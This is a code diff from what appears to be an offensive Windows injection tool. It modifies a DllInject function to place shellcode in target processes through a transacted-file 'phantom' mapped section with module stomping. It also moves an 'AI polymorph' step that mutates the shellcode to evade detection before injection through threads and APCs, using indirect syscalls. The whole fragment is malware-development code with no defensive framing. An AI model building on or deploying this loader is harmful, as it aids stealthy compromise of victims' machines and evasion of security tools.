@@ -905,6 +905,11 @@ void DllInject(HANDLE hProcess,
     if (usePhantomMapper && !pRemoteCode) {
         pRemoteCode = PhantomMapper::InjectTransacted(hProcess, nullptr, remoteRegionSize);
         if (pRemoteCode) {
+            moduleStomped = true;
+            VERBOSE(L"PhantomMapper: Using TxF mapped section at %p", pRemoteCode);
+        }
+    }
+
     if (!pRemoteCode) {
         if (useIndirectSyscalls) {
             NTSTATUS status = IndirectSyscall::IndirectNtAllocateVirtualMemory(
@@ -931,6 +936,24 @@ void DllInject(HANDLE hProcess,
         }
     });
 
+    // Apply Phase 7 AI Semantic Mutation to the shellcode right before we dump it over
+    std::vector<BYTE> polymorphicPayload;
+    const BYTE* pInjectionSource = shellcode;
+    SIZE_T injectionSize = shellcodeSize;
+    size_t mutationOffset = 0;
+
+    if (useAiPolymorph) {
+        polymorphicPayload = AiPolymorph::MutatePayloadWithAI(shellcode, shellcodeSize, &mutationOffset);
+        if (!polymorphicPayload.empty()) {
+            pInjectionSource = polymorphicPayload.data();
+            injectionSize = polymorphicPayload.size();
+            
+            // Adjust entry points based on the AI mutation prologue
+            shellcodeThreadOffset += mutationOffset;
+            shellcodeAPCOffset += mutationOffset;
+        }
+    }
+
     LPTHREAD_START_ROUTINE pRemoteThreadAddress =
         reinterpret_cast<LPTHREAD_START_ROUTINE>(
             reinterpret_cast<BYTE*>(pRemoteCode) + shellcodeThreadOffset);
@@ -940,22 +963,6 @@ void DllInject(HANDLE hProcess,
 
     shellcodeData->pThreadShellcodeAddress = pRemoteThreadAddress;
     shellcodeData->pAPCShellcodeAddress = pRemoteAPCAddress;
-
-    void* pRemoteData =
-        reinterpret_cast<BYTE*>(pRemoteCode) + shellcodeSizeAligned;
-        
-    // Apply Phase 7 AI Semantic Mutation to the shellcode right before we dump it over
-    std::vector<BYTE> polymorphicPayload;
-    const BYTE* pInjectionSource = shellcode;
-    SIZE_T injectionSize = shellcodeSize;
-
-    if (useAiPolymorph) {
-        polymorphicPayload = AiPolymorph::MutatePayloadWithAI(shellcode, shellcodeSize);
-        if (!polymorphicPayload.empty()) {
-            pInjectionSource = polymorphicPayload.data();
-            injectionSize = polymorphicPayload.size();
-        }
-    }
 
     if (useIndirectSyscalls) {
         NTSTATUS status;
